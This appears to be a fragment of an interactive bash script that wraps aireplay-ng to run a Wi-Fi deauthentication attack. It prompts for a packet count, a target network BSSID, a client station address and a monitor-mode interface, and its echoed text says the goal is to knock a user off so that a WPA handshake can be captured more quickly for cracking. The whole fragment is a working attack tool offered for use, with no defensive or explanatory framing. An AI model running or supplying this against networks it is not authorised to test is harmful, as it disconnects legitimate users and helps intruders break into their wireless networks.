...
echo "[+] This script is used to speed up the handshake process by de-auth method"
sleep 5
echo "Enter the number of times to send de-auth :"
read deauth
echo "Enter the bssid of network : "
read bssid
echo "Ether the station address : "
read client
echo "Enter the monitor network interface :"
iwconfig
read mni
echo "[+] Running air-replay to de-auth a user for faster handshake process....."
sleep 10
clear
aireplay-ng -0 $deauth -a $bssid -c $client $mni
